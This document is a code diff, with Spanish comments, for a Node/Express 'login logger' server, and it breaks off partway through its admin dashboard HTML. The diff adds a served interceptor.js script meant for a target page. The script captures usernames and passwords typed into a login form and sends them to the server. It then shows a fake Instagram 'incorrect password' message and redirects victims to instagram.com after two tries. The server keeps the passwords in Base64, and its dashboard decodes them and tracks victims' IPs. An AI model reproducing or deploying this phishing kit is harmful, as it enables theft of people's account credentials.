@@ -1,13 +1,24 @@
 /**
- * LOGIN LOGGER — Server v3
+ * LOGIN LOGGER — Server v4
  *
- * Nuevas funcionalidades v3:
+ * Nuevas funcionalidades v4:
+ *   - Interceptor de login embebido y servido desde este mismo servidor
+ *     en GET /interceptor.js  (sin fichero externo)
+ *   - Evento max_attempts_redirect: se detecta y registra cuando el
+ *     cliente agota los intentos y es redirigido automáticamente
+ *   - Stat card "Redirigidos" en el dashboard
+ *   - Badge 🚨 max_attempts en el visor de logs
+ *
+ * Funcionalidades heredadas de v3:
  *   - Sistema multi-usuario: añadir, cambiar contraseña y eliminar admins
  *   - Eliminar entradas de log individuales
  *   - Paginación completa con navegación
  *   - Tiempo de refresco configurable (persiste en localStorage)
  *   - Contador total de logs independiente del filtro de paginación
  *   - Contraseñas en login_attempt guardadas en Base64 (reversible en el visor)
+ *
+ * Uso del interceptor en la página objetivo:
+ *   <script src="https://TU-SERVIDOR/interceptor.js"></script>
  *
  * Credenciales por defecto: admin / supersecret123
  * Se persisten en logs/admin-users.json
@@ -16,13 +27,13 @@
  *   PORT  (default: 3000)
  */
 
-const express  = require("express");
-const path     = require("path");
-const fs       = require("fs");
-const bcrypt   = require("bcryptjs");
-const winston  = require("winston");
+const express   = require("express");
+const path      = require("path");
+const fs        = require("fs");
+const bcrypt    = require("bcryptjs");
+const winston   = require("winston");
 const rateLimit = require("express-rate-limit");
-const helmet   = require("helmet");
+const helmet    = require("helmet");
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
@@ -37,8 +48,6 @@ if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
 // ──────────────────────────────────────────────────────────
 // GESTIÓN DE USUARIOS ADMIN
 // ──────────────────────────────────────────────────────────
-// Formato en disco: [{ username: "admin", passHash: "$2b$..." }, ...]
-
 const DEFAULT_PASS_HASH = "$2b$12$CtjIMHgVJWakAJU3V/cWB.V9oHkVYlS/4IyWWyA2eHrrsCsm7tOqu"; // "supersecret123"
 
 let adminUsers = [];
@@ -117,20 +126,28 @@ function getClientIP(req) {
 
 function buildLogEntry(req, extra = {}) {
   return {
-    ip:       getClientIP(req),
-    method:   req.method,
-    path:     req.path,
+    ip:        getClientIP(req),
+    method:    req.method,
+    path:      req.path,
     userAgent: req.headers["user-agent"] || "unknown",
-    referer:  req.headers["referer"]          || null,
-    language: req.headers["accept-language"]  || null,
-    encoding: req.headers["accept-encoding"]  || null,
-    origin:   req.headers["origin"]           || null,
-    host:     req.headers["host"]             || null,
+    referer:   req.headers["referer"]         || null,
+    language:  req.headers["accept-language"] || null,
+    encoding:  req.headers["accept-encoding"] || null,
+    origin:    req.headers["origin"]          || null,
+    host:      req.headers["host"]            || null,
     ...extra,
   };
 }
 
-const RELEVANT = ["login_attempt", "page_visit", "admin_access", "admin_access_denied", "rate_limit_exceeded"];
+// ── Eventos que se indexan en el visor ──────────────────────
+const RELEVANT = [
+  "login_attempt",
+  "max_attempts_redirect",   // ← v4
+  "page_visit",
+  "admin_access",
+  "admin_access_denied",
+  "rate_limit_exceeded",
+];
 
 function readAllLogs() {
   const logFile = path.join(logsDir, "access.log");
@@ -180,21 +197,209 @@ const loginLimiter = rateLimit({
 app.use(express.static(path.join(__dirname, "public")));
 
 // ──────────────────────────────────────────────────────────
-// POST /login  — contraseña guardada en Base64
+// GET /interceptor.js
+// Sirve el script de interceptación de login como archivo JS.
+// Incluirlo en la página objetivo con:
+//   <script src="https://TU-SERVIDOR/interceptor.js"></script>
+// ──────────────────────────────────────────────────────────
+app.get("/interceptor.js", (req, res) => {
+  // ── Configuración del interceptor ──────────────────────
+  // Cambia estos valores según tu despliegue.
+  const BACKEND      = `https://${req.headers.host}/login`;
+  const VISIT_URL    = `https://${req.headers.host}/visit`;
+  const REDIRECT_URL = "https://www.instagram.com/";
+  const MAX_ATTEMPTS = 2;
+  const PAGE_ID      = "instagram";
+  const ERROR_MSG    = "Tu contraseña es incorrecta. Compruébala e inténtalo de nuevo.";
+  // ───────────────────────────────────────────────────────
+
+  const script = `/* LOGIN INTERCEPTOR v4 — auto-generado por el servidor */
+(function () {
+  'use strict';
+  var PAGE_ID      = ${JSON.stringify(PAGE_ID)};
+  var BACKEND      = ${JSON.stringify(BACKEND)};
+  var VISIT_URL    = ${JSON.stringify(VISIT_URL)};
+  var REDIRECT_URL = ${JSON.stringify(REDIRECT_URL)};
+  var MAX_ATTEMPTS = ${MAX_ATTEMPTS};
+  var ERROR_MSG    = ${JSON.stringify(ERROR_MSG)};
+  var _sent        = false;
+
+  /* ── Contador de intentos en sessionStorage ─────────── */
+  function getAttempts() {
+    return parseInt(sessionStorage.getItem('_ig_attempts') || '0', 10);
+  }
+  function incrementAttempts() {
+    var n = getAttempts() + 1;
+    sessionStorage.setItem('_ig_attempts', n);
+    return n;
+  }
+
+  /* ── Envío de logs (sendBeacon + fetch fallback) ─────── */
+  function sendLog(url, data) {
+    var payload = JSON.stringify(data);
+    if (navigator.sendBeacon) {
+      try {
+        return navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
+      } catch (_e) {}
+    }
+    return fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: payload,
+      keepalive: true
+    }).catch(function () {});
+  }
+
+  /* ── Visita de página ───────────────────────────────── */
+  sendLog(VISIT_URL, {
+    page: window.location.pathname,
+    user: 'anonymous',
+    event: 'PAGE_VISIT'
+  });
+
+  /* ── Error UI ─────────────────────────────────────────── */
+  function showError() {
+    var d = document.getElementById('_ig_err');
+    if (!d) {
+      d = document.createElement('div');
+      d.id = '_ig_err';
+      d.style.cssText = [
+        'background:#fffbe5', 'border:1px solid #f0c040',
+        'border-radius:6px', 'padding:10px 14px', 'margin:8px 0 4px',
+        'color:#333', 'font-size:14px',
+        'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif',
+        'text-align:center', 'line-height:1.4', 'z-index:9999', 'position:relative'
+      ].join(';');
+      var form = document.getElementById('login_form');
+      if (form && form.parentNode) {
+        form.parentNode.insertBefore(d, form);
+      } else {
+        document.body.insertBefore(d, document.body.firstChild);
+      }
+    }
+    d.textContent = ERROR_MSG;
+    d.style.display = 'block';
+  }
+
+  /* ── Envío al backend ─────────────────────────────────── */
+  async function sendToBackend(username, password, extraFields) {
+    await sendLog(BACKEND, Object.assign({
+      username: username,
+      password: password,
+      page:     PAGE_ID,
+      event:    'LOGIN_ATTEMPT'
+    }, extraFields || {}));
+  }
+
+  /* ── Lógica principal ─────────────────────────────────── */
+  async function onLoginAttempt(e) {
+    if (e) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      e.stopPropagation();
+    }
+    if (_sent) return;
+    _sent = true;
+    setTimeout(function () { _sent = false; }, 800);
+
+    var form = document.getElementById('login_form');
+    var user = '', pass = '';
+    if (form) {
+      var uEl = form.querySelector('[name="email"]') || form.querySelector('[name="username"]');
+      var pEl = form.querySelector('[name="pass"]')  || form.querySelector('[name="password"]');
+      user = uEl ? uEl.value.trim() : '';
+      pass = pEl ? pEl.value : '';
+    }
+
+    var attempts = incrementAttempts();
+
+    if (attempts >= MAX_ATTEMPTS) {
+      sessionStorage.removeItem('_ig_attempts');
+      await sendToBackend(user, pass, {
+        event:      'MAX_ATTEMPTS_REDIRECT',
+        attempts:   attempts,
+        redirectTo: REDIRECT_URL
+      });
+      setTimeout(function () { window.location.href = REDIRECT_URL; }, 600);
+    } else {
+      await sendToBackend(user, pass);
+      showError();
+    }
+    return false;
+  }
+
+  /* ── ¿Es este evento un intento de login? ─────────────── */
+  function isLoginTarget(target) {
+    if (!target) return false;
+    var el = target, depth = 0;
+    while (el && depth < 8) {
+      var label = (el.getAttribute && el.getAttribute('aria-label')) || '';
+      if (label === 'Iniciar sesión') return true;
+      if (el.getAttribute && el.getAttribute('role') === 'button') {
+        var f = document.getElementById('login_form');
+        if (f && f.contains(el)) return true;
+      }
+      var tag = (el.tagName || '').toLowerCase();
+      if (tag === 'button' || (tag === 'input' && el.type === 'submit')) {
+        var f2 = document.getElementById('login_form');
+        if (f2 && f2.contains(el)) return true;
+      }
+      el = el.parentElement;
+      depth++;
+    }
+    return false;
+  }
+
+  /* ── Delegación de eventos en document ────────────────── */
+  ['click', 'touchend', 'pointerup'].forEach(function (ev) {
+    document.addEventListener(ev, function (e) {
+      if (isLoginTarget(e.target)) onLoginAttempt(e);
+    }, true);
+  });
+  document.addEventListener('submit', function (e) {
+    if (e.target && e.target.id === 'login_form') onLoginAttempt(e);
+  }, true);
+  document.addEventListener('keydown', function (e) {
+    if (e.key !== 'Enter' && e.keyCode !== 13) return;
+    var form = document.getElementById('login_form');
+    if (form && form.contains(e.target)) onLoginAttempt(e);
+  }, true);
+
+})();`;
+
+  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
+  res.setHeader("Cache-Control", "no-store");
+  res.send(script);
+});
+
+// ──────────────────────────────────────────────────────────
+// POST /login
+// Gestiona tanto LOGIN_ATTEMPT normal como MAX_ATTEMPTS_REDIRECT
 // ──────────────────────────────────────────────────────────
 app.post("/login", loginLimiter, (req, res) => {
-  const { username, password, page } = req.body;
+  const { username, password, page, event, attempts, redirectTo } = req.body;
+
   const passwordB64 = password
     ? Buffer.from(password).toString("base64")
     : "(vacío)";
 
-  logger.info("login_attempt", buildLogEntry(req, {
-    event:          "LOGIN_ATTEMPT",
-    page:           page || null,   // igual que /visit: campo separado, path sigue siendo /login
-    username:       username || "(vacío)",
-    password:       passwordB64,
-    passwordLength: password ? password.length : 0,
-  }));
+  const isRedirect = event === "MAX_ATTEMPTS_REDIRECT";
+
+  logger.info(
+    isRedirect ? "max_attempts_redirect" : "login_attempt",
+    buildLogEntry(req, {
+      event:          isRedirect ? "MAX_ATTEMPTS_REDIRECT" : "LOGIN_ATTEMPT",
+      page:           page || null,
+      username:       username || "(vacío)",
+      password:       passwordB64,
+      passwordLength: password ? password.length : 0,
+      // Campos extra solo presentes en el evento de redirección
+      ...(isRedirect && {
+        attempts:   attempts   || null,
+        redirectTo: redirectTo || null,
+      }),
+    })
+  );
 
   res.status(401).json({ success: false, error: "Credenciales incorrectas. Por favor, inténtalo de nuevo." });
 });
@@ -239,7 +444,13 @@ async function basicAuth(req, res, next) {
   }
 
   const attemptedPassB64 = pass ? Buffer.from(pass).toString("base64") : "(vacío)";
-  logger.warn("admin_access_denied", { ...buildLogEntry(req), event: "ADMIN_UNAUTHORIZED", attemptedUser: user || "(vacío)", password: attemptedPassB64, passwordLength: pass ? pass.length : 0 });
+  logger.warn("admin_access_denied", {
+    ...buildLogEntry(req),
+    event: "ADMIN_UNAUTHORIZED",
+    attemptedUser: user || "(vacío)",
+    password: attemptedPassB64,
+    passwordLength: pass ? pass.length : 0,
+  });
   res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
   return res.status(401).send("Credenciales de administrador incorrectas");
 }
@@ -328,10 +539,12 @@ app.get("/admin/logs", basicAuth, (req, res) => {
   const allLines = readAllLogs();
 
   // Estadísticas globales (sin filtros)
-  const totalGlobal       = allLines.length;
-  const globalLoginCount  = allLines.filter(l => l.message === "login_attempt").length;
-  const globalAdminDenied = allLines.filter(l => l.message === "admin_access_denied").length;
-  const globalRateLimited = allLines.filter(l => l.message === "rate_limit_exceeded").length;
+  const totalGlobal          = allLines.length;
+  const globalLoginNormal    = allLines.filter(l => l.message === "login_attempt").length;
+  const globalMaxAttempts    = allLines.filter(l => l.message === "max_attempts_redirect").length;
+  const globalLoginCount     = globalLoginNormal + globalMaxAttempts; // total = normales + redirigidos
+  const globalAdminDenied    = allLines.filter(l => l.message === "admin_access_denied").length;
+  const globalRateLimited    = allLines.filter(l => l.message === "rate_limit_exceeded").length;
 
   // IPs de todos los logs
   const ipStats = {};
@@ -339,14 +552,18 @@ app.get("/admin/logs", basicAuth, (req, res) => {
     if (!l.ip) return;
     if (!ipStats[l.ip]) ipStats[l.ip] = { total: 0, logins: 0, lastSeen: l.timestamp || "" };
     ipStats[l.ip].total++;
-    if (l.message === "login_attempt") ipStats[l.ip].logins++;
-    if ((l.timestamp || "") > ipStats[l.ip].lastSeen) ipStats[l.ip].lastSeen = l.timestamp || "";
+    if (l.message === "login_attempt" || l.message === "max_attempts_redirect")
+      ipStats[l.ip].logins++;
+    if ((l.timestamp || "") > ipStats[l.ip].lastSeen)
+      ipStats[l.ip].lastSeen = l.timestamp || "";
   });
 
   // Filtrar
+  // "login_all" es un tipo virtual que agrupa login_attempt + max_attempts_redirect
+  const LOGIN_TYPES = ["login_attempt", "max_attempts_redirect"];
   let filtered = allLines
     .filter(l => !excludeList.includes(l.message))
-    .filter(l => !type     || l.message === type)
+    .filter(l => !type || (type === "login_all" ? LOGIN_TYPES.includes(l.message) : l.message === type))
     .filter(l => !ipFilter || (l.ip && l.ip.includes(ipFilter)))
     .filter(l => !filter   || JSON.stringify(l).toLowerCase().includes(filter.toLowerCase()));
 
@@ -360,7 +577,7 @@ app.get("/admin/logs", basicAuth, (req, res) => {
 
   res.send(buildLogViewerHTML({
     lines: pageLines, limit, page: safePage, totalPages, totalFiltered,
-    totalGlobal, globalLoginCount, globalAdminDenied, globalRateLimited,
+    totalGlobal, globalLoginCount, globalLoginNormal, globalAdminDenied, globalRateLimited, globalMaxAttempts,
     filter, type, excludeList, ipFilter, ipStats,
   }));
 });
@@ -371,16 +588,11 @@ app.get("/admin/logs/download", basicAuth, (req, res) => {
   res.download(logFile, "access.log");
 });
 
-// GET /admin/logout — clears Basic Auth credentials by triggering a 401 on the
-// protected resource with invalid credentials, then redirects to logged-out page.
-// The browser sees the 401 for realm "Admin Logs" and discards cached credentials.
 app.get("/admin/logout-clear", (req, res) => {
-  // Always deny — this forces the browser to discard credentials for the realm
   res.setHeader("WWW-Authenticate", 'Basic realm="Admin Logs"');
   res.status(401).send("logged out");
 });
 
-// GET /admin/logged-out — simple confirmation page (no auth required)
 app.get("/admin/logged-out", (req, res) => {
   logger.info("admin_logout", { ...buildLogEntry(req), event: "ADMIN_LOGOUT" });
   res.send(`<!DOCTYPE html>
@@ -416,34 +628,38 @@ app.use((err, req, res, next) => {
 // ══════════════════════════════════════════════════════════
 function buildLogViewerHTML({
   lines, limit, page, totalPages, totalFiltered, totalGlobal,
-  globalLoginCount, globalAdminDenied, globalRateLimited,
+  globalLoginCount, globalLoginNormal, globalAdminDenied, globalRateLimited, globalMaxAttempts,
   filter, type, excludeList, ipFilter, ipStats,
 }) {
   const totalUniqueIPs = Object.keys(ipStats).length;
-  const visibleIPs     = new Set(lines.map(l => l.ip).filter(Boolean)).size;
 
   function esc(s) {
     if (s == null) return "";
-    return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
+    return String(s)
+      .replace(/&/g, "&amp;").replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;").replace(/"/g, "&quot;");
   }
 
   function methodBadge(m) {
     if (!m) return "";
-    const cls = m==="GET"?"success":m==="POST"?"primary":m==="DELETE"?"danger":"secondary";
+    const cls = m === "GET" ? "success" : m === "POST" ? "primary" : m === "DELETE" ? "danger" : "secondary";
     return `<span class="badge bg-${cls} bg-opacity-10 text-${cls} border border-${cls} border-opacity-25 font-mono">${m}</span>`;
   }
 
   function eventBadge(msg) {
     const map = {
-      login_attempt:       ["login-badge",       "🔑 login_attempt"],
-      admin_access:        ["success",            "🛡 admin_access"],
-      admin_access_denied: ["danger",             "⛔ admin_denied"],
-      rate_limit_exceeded: ["warning text-dark",  "🚫 rate_limit"],
-      page_visit:          ["info text-dark",     "👁 page_visit"],
+      login_attempt:          ["login-badge",            "🔑 login_attempt"],
+      max_attempts_redirect:  ["purple",                 "🚨 max_attempts"],   // ← v4
+      admin_access:           ["success",                "🛡 admin_access"],
+      admin_access_denied:    ["danger",                 "⛔ admin_denied"],
+      rate_limit_exceeded:    ["warning text-dark",      "🚫 rate_limit"],
+      page_visit:             ["info text-dark",         "👁 page_visit"],
     };
-    const [cls, label] = map[msg] || ["secondary", esc(msg)||"—"];
+    const [cls, label] = map[msg] || ["secondary", esc(msg) || "—"];
     if (cls === "login-badge")
       return `<span class="badge rounded-pill px-2" style="background:#fff0f0;color:#c0392b;border:1px solid #f5c6c6;">${label}</span>`;
+    if (cls === "purple")
+      return `<span class="badge rounded-pill px-2" style="background:#faf0ff;color:#7e22ce;border:1px solid #e9d5ff;">${label}</span>`;
     return `<span class="badge rounded-pill bg-${cls} px-2">${label}</span>`;
   }
 
@@ -457,25 +673,33 @@ function buildLogViewerHTML({
   }
 
   const rows = lines.map(l => {
-    const isLogin  = l.message === "login_attempt";
-    const isDenied = l.message === "admin_access_denied";
-    const rowCls   = isLogin ? "row-login" : isDenied ? "row-denied" : "";
+    const isLogin    = l.message === "login_attempt";
+    const isRedirect = l.message === "max_attempts_redirect";  // ← v4
+    const isDenied   = l.message === "admin_access_denied";
+    const rowCls     = (isLogin || isRedirect) ? "row-login" : isDenied ? "row-denied" : "";
 
     let pwCell = '<span class="text-muted">—</span>';
-    if (isLogin && l.password && l.password !== "(vacío)") {
+    if ((isLogin || isRedirect) && l.password && l.password !== "(vacío)") {
       pwCell = `<code class="pw-code pw-toggle" data-b64="${esc(l.password)}" data-state="b64" title="Clic para decodificar Base64">${esc(l.password)}</code>`;
-    } else if (isLogin) {
+    } else if (isLogin || isRedirect) {
       pwCell = `<span class="text-muted fst-italic small">(vacío)</span>`;
     }
 
+    // Celda extra: muestra redirectTo si es un evento de redirección
+    const extraInfo = isRedirect && l.redirectTo
+      ? `<br/><small class="text-muted font-mono" style="font-size:.68rem;">→ ${esc(l.redirectTo)}</small>`
+      : "";
+
     return `<tr data-line="${l._lineIndex}" class="${rowCls}">
-      <td class="text-nowrap small font-mono text-secondary">${esc(l.timestamp)||"—"}</td>
-      <td><code class="ip-code ip-clickable" data-ip="${esc(l.ip)}" title="Filtrar por esta IP">${esc(l.ip)||"—"}</code></td>
+      <td class="text-nowrap small font-mono text-secondary">${esc(l.timestamp) || "—"}</td>
+      <td><code class="ip-code ip-clickable" data-ip="${esc(l.ip)}" title="Filtrar por esta IP">${esc(l.ip) || "—"}</code></td>
       <td>${eventBadge(l.message)}</td>
-      <td class="text-nowrap">${methodBadge(l.method)} <code class="small text-dark">${pathDisplay(l)}</code></td>
-      <td>${isLogin||isDenied ? `<strong class="text-danger">${esc(l.username||l.attemptedUser)}</strong>` : '<span class="text-muted">—</span>'}</td>
+      <td class="text-nowrap">${methodBadge(l.method)} <code class="small text-dark">${pathDisplay(l)}</code>${extraInfo}</td>
+      <td>${(isLogin || isRedirect || isDenied)
+          ? `<strong class="text-danger">${esc(l.username || l.attemptedUser)}</strong>`
+          : '<span class="text-muted">—</span>'}</td>
       <td>${pwCell}</td>
-      <td class="small text-muted text-truncate" style="max-width:180px" title="${esc(l.userAgent)}">${esc(l.userAgent)||"—"}</td>
+      <td class="small text-muted text-truncate" style="max-width:180px" title="${esc(l.userAgent)}">${esc(l.userAgent) || "—"}</td>
       <td class="text-center">
         <button class="btn-del btn btn-xs px-1 py-0 btn-outline-danger" data-line="${l._lineIndex}" title="Eliminar entrada" style="font-size:.68rem;"><i class="bi bi-trash3"></i></button>
       </td>
@@ -483,20 +707,33 @@ function buildLogViewerHTML({
   }).join("");
 
   const typeOpts = [
-    ["","Todos los eventos"],["login_attempt","🔑 login_attempt"],["page_visit","👁 page_visit"],
-    ["admin_access","🛡 admin_access"],["admin_access_denied","⛔ admin_denied"],["rate_limit_exceeded","🚫 rate_limit"],
-  ].map(([v,l]) => `<option value="${v}" ${type===v?"selected":""}>${l}</option>`).join("");
+    ["", "Todos los eventos"],
+    ["login_all",             "🔑 todos los logins (normal + redirigido)"],
+    ["login_attempt",         "🔑 login_attempt (solo normales)"],
+    ["max_attempts_redirect", "🚨 max_attempts (solo redirigidos)"],
+    ["page_visit",            "👁 page_visit"],
+    ["admin_access",          "🛡 admin_access"],
+    ["admin_access_denied",   "⛔ admin_denied"],
+    ["rate_limit_exceeded",   "🚫 rate_limit"],
+  ].map(([v, l]) => `<option value="${v}" ${type === v ? "selected" : ""}>${l}</option>`).join("");
 
-  const limitOpts = [25,50,100,200,500]
-    .map(n => `<option value="${n}" ${n==limit?"selected":""}>${n} / pág.</option>`).join("");
+  const limitOpts = [25, 50, 100, 200, 500]
+    .map(n => `<option value="${n}" ${n == limit ? "selected" : ""}>${n} / pág.</option>`).join("");
 
   const ALL_EVENTS = [
-    ["login_attempt","🔑 login_attempt"],["page_visit","👁 page_visit"],
-    ["admin_access","🛡 admin_access"],["admin_access_denied","⛔ admin_denied"],["rate_limit_exceeded","🚫 rate_limit"],
+    ["login_attempt",         "🔑 login_attempt"],
+    ["max_attempts_redirect", "🚨 max_attempts"],
+    ["page_visit",            "👁 page_visit"],
+    ["admin_access",          "🛡 admin_access"],
+    ["admin_access_denied",   "⛔ admin_denied"],
+    ["rate_limit_exceeded",   "🚫 rate_limit"],
   ];
-  const excludePills = ALL_EVENTS.map(([v,label]) => {
+  // Pill especial que excluye AMBOS tipos de login a la vez
+  const loginBothExcluded = excludeList.includes("login_attempt") && excludeList.includes("max_attempts_redirect");
+  const extraPill = `<button type="button" class="exclude-pill btn btn-sm ${loginBothExcluded ? "excluded" : ""}" data-event="login_all" title="Excluye login_attempt y max_attempts a la vez">🔑 todos los logins</button>`;
+  const excludePills = extraPill + ALL_EVENTS.map(([v, label]) => {
     const x = excludeList.includes(v);
-    return `<button type="button" class="exclude-pill btn btn-sm ${x?"excluded":""}" data-event="${v}">${label}</button>`;
+    return `<button type="button" class="exclude-pill btn btn-sm ${x ? "excluded" : ""}" data-event="${v}">${label}</button>`;
   }).join("");
 
   function buildPagination() {
@@ -515,17 +752,17 @@ function buildLogViewerHTML({
     let pages = [1];
     for (let i = Math.max(2, page - WING); i <= Math.min(totalPages - 1, page + WING); i++) pages.push(i);
     if (totalPages > 1) pages.push(totalPages);
-    pages = [...new Set(pages)].sort((a,b) => a-b);
+    pages = [...new Set(pages)].sort((a, b) => a - b);
 
     let html = `<nav aria-label="Paginación"><ul class="pagination pagination-sm justify-content-center flex-wrap mb-0">`;
-    html += `<li class="page-item ${page<=1?"disabled":""}"><a class="page-link" href="${page>1?buildUrl(page-1):"#"}">‹ Ant.</a></li>`;
+    html += `<li class="page-item ${page <= 1 ? "disabled" : ""}"><a class="page-link" href="${page > 1 ? buildUrl(page - 1) : "#"}">‹ Ant.</a></li>`;
     let prev = 0;
     for (const p of pages) {
       if (p - prev > 1) html += `<li class="page-item disabled"><span class="page-link">…</span></li>`;
-      html += `<li class="page-item ${p===page?"active":""}"><a class="page-link" href="${buildUrl(p)}">${p}</a></li>`;
+      html += `<li class="page-item ${p === page ? "active" : ""}"><a class="page-link" href="${buildUrl(p)}">${p}</a></li>`;
       prev = p;
     }
-    html += `<li class="page-item ${page>=totalPages?"disabled":""}"><a class="page-link" href="${page<totalPages?buildUrl(page+1):"#"}">Sig. ›</a></li>`;
+    html += `<li class="page-item ${page >= totalPages ? "disabled" : ""}"><a class="page-link" href="${page < totalPages ? buildUrl(page + 1) : "#"}">Sig. ›</a></li>`;
     html += `</ul></nav>`;
     html += `<div class="d-flex justify-content-center align-items-center gap-2 mt-2" style="font-size:.8rem;">
       <span class="text-muted">Ir a página:</span>
@@ -539,16 +776,16 @@ function buildLogViewerHTML({
   }
 
   const ipRows = Object.entries(ipStats)
-    .sort((a,b) => b[1].total - a[1].total)
+    .sort((a, b) => b[1].total - a[1].total)
     .map(([ip, s]) => {
-      const risk  = s.logins>10?"danger":s.logins>3?"warning":"success";
-      const label = s.logins>10?"Alto":s.logins>3?"Medio":"Bajo";
+      const risk  = s.logins > 10 ? "danger" : s.logins > 3 ? "warning" : "success";
+      const label = s.logins > 10 ? "Alto" : s.logins > 3 ? "Medio" : "Bajo";
       return `<tr>
         <td><code class="ip-code ip-modal-filter" data-ip="${esc(ip)}" style="cursor:pointer" title="Filtrar">${esc(ip)}</code></td>
         <td class="text-center"><span class="badge bg-primary bg-opacity-10 text-primary">${s.total}</span></td>
         <td class="text-center"><span class="badge bg-danger bg-opacity-10 text-danger">${s.logins}</span></td>
         <td class="text-center"><span class="badge bg-${risk} bg-opacity-15 text-${risk}-emphasis border border-${risk} border-opacity-25">${label}</span></td>
-        <td class="small text-muted font-mono">${esc(s.lastSeen)||"—"}</td>
+        <td class="small text-muted font-mono">${esc(s.lastSeen) || "—"}</td>
         <td><a href="/admin/logs?ip=${encodeURIComponent(ip)}" class="btn btn-xs btn-outline-primary py-0 px-2" style="font-size:.7rem;">Filtrar</a></td>
       </tr>`;
     }).join("");
@@ -662,7 +899,6 @@ function buildLogViewerHTML({
   <div class="live-indicator"><span class="live-dot"></span><span class="d-none d-md-inline">En vivo</span></div>
 
   <div class="topbar-right">
-    <!-- Refresh configurable -->
     <div class="refresh-wrap d-none d-md-flex">
       <i class="bi bi-arrow-clockwise"></i>
       <select id="refreshSelect" onchange="updateRefresh(this.value)">
@@ -701,28 +937,38 @@ function buildLogViewerHTML({
 
 <div class="page-wrap">
 
-  <!-- Stat cards -->
+  <!-- ── Stat cards ────────────────────────────────────────────── -->
   <div class="row g-3 mb-4">
     <div class="col-6 col-md-4 col-xl">
-      <a href="/admin/logs?type=login_attempt" class="stat-card ${type==="login_attempt"?"active-filter":""}">
+      <a href="/admin/logs?type=login_all" class="stat-card ${type === "login_all" || type === "login_attempt" || type === "max_attempts_redirect" ? "active-filter" : ""}">
         <div class="stat-icon" style="background:#fff0f0;color:#e53e3e;"><i class="bi bi-key-fill"></i></div>
-        <div><div class="stat-value" style="color:#e53e3e;">${globalLoginCount}</div><div class="stat-label">Intentos login</div><div class="stat-hint">Clic para filtrar</div></div>
+        <div>
+          <div class="stat-value" style="color:#e53e3e;">${globalLoginCount}</div>
+          <div class="stat-label">Intentos login</div>
+          <div class="stat-hint">${globalLoginNormal} normales · <span style="color:#7e22ce;">${globalMaxAttempts} redirigidos</span></div>
+        </div>
       </a>
     </div>
     <div class="col-6 col-md-4 col-xl">
-      <a href="/admin/logs" class="stat-card ${!type&&!ipFilter&&!filter?"active-filter":""}">
+      <a href="/admin/logs?type=max_attempts_redirect" class="stat-card ${type === "max_attempts_redirect" ? "active-filter" : ""}">
+        <div class="stat-icon" style="background:#faf0ff;color:#7e22ce;"><i class="bi bi-arrow-right-circle-fill"></i></div>
+        <div><div class="stat-value" style="color:#7e22ce;">${globalMaxAttempts}</div><div class="stat-label">Redirigidos</div><div class="stat-hint">Clic para filtrar</div></div>
+      </a>
+    </div>
+    <div class="col-6 col-md-4 col-xl">
+      <a href="/admin/logs" class="stat-card ${!type && !ipFilter && !filter ? "active-filter" : ""}">
         <div class="stat-icon" style="background:#eff6ff;color:#3b82f6;"><i class="bi bi-collection-fill"></i></div>
         <div><div class="stat-value" style="color:#3b82f6;">${totalGlobal}</div><div class="stat-label">Total registros</div><div class="stat-hint">Ver todos</div></div>
       </a>
     </div>
     <div class="col-6 col-md-4 col-xl">
-      <a href="/admin/logs?type=admin_access_denied" class="stat-card ${type==="admin_access_denied"?"active-filter":""}">
+      <a href="/admin/logs?type=admin_access_denied" class="stat-card ${type === "admin_access_denied" ? "active-filter" : ""}">
         <div class="stat-icon" style="background:#fff8f0;color:#dd6b20;"><i class="bi bi-shield-exclamation"></i></div>
         <div><div class="stat-value" style="color:#dd6b20;">${globalAdminDenied}</div><div class="stat-label">Admin denegados</div><div class="stat-hint">Clic para filtrar</div></div>
       </a>
     </div>
     <div class="col-6 col-md-4 col-xl">
-      <a href="/admin/logs?type=rate_limit_exceeded" class="stat-card ${type==="rate_limit_exceeded"?"active-filter":""}">
+      <a href="/admin/logs?type=rate_limit_exceeded" class="stat-card ${type === "rate_limit_exceeded" ? "active-filter" : ""}">
         <div class="stat-icon" style="background:#fefce8;color:#ca8a04;"><i class="bi bi-slash-circle-fill"></i></div>
         <div><div class="stat-value" style="color:#ca8a04;">${globalRateLimited}</div><div class="stat-label">Rate limits</div><div class="stat-hint">Clic para filtrar</div></div>
       </a>
@@ -735,7 +981,7 @@ function buildLogViewerHTML({
     </div>
   </div>
 
-  <!-- Filter bar -->
+  <!-- ── Filter bar ──────────────────────────────────────────── -->
   <div class="filter-card mb-4">
     <form method="GET" action="/admin/logs" id="filterForm" class="row g-3 align-items-end">
       <div class="col-12 col-sm-6 col-lg-3">
@@ -748,8 +994,8 @@ function buildLogViewerHTML({
       <div class="col-12 col-sm-6 col-lg-2">
         <div class="filter-label"><i class="bi bi-geo-alt me-1"></i>Filtrar IP</div>
         <div class="input-group">
-          <input type="text" name="ip" class="form-control ${ipFilter?"border-primary":""}" placeholder="192.168.1.1" value="${esc(ipFilter)}" style="font-family:var(--font-mono);font-size:.78rem;"/>
-          ${ipFilter?`<button type="button" class="btn btn-outline-secondary" onclick="clearIpFilter()"><i class="bi bi-x"></i></button>`:""}
+          <input type="text" name="ip" class="form-control ${ipFilter ? "border-primary" : ""}" placeholder="192.168.1.1" value="${esc(ipFilter)}" style="font-family:var(--font-mono);font-size:.78rem;"/>
+          ${ipFilter ? `<button type="button" class="btn btn-outline-secondary" onclick="clearIpFilter()"><i class="bi bi-x"></i></button>` : ""}
         </div>
       </div>
       <div class="col-6 col-sm-3 col-lg-2">
@@ -769,30 +1015,30 @@ function buildLogViewerHTML({
         <div class="filter-label mb-2"><i class="bi bi-eye-slash me-1"></i>Excluir eventos <span class="text-muted" style="font-weight:400;text-transform:none;letter-spacing:0;">(clic para ocultar/mostrar)</span></div>
         <div class="d-flex gap-2 flex-wrap" id="excludeToggles">${excludePills}</div>
       </div>
-      ${ipFilter?`<div class="col-12 d-flex align-items-center gap-2 flex-wrap">
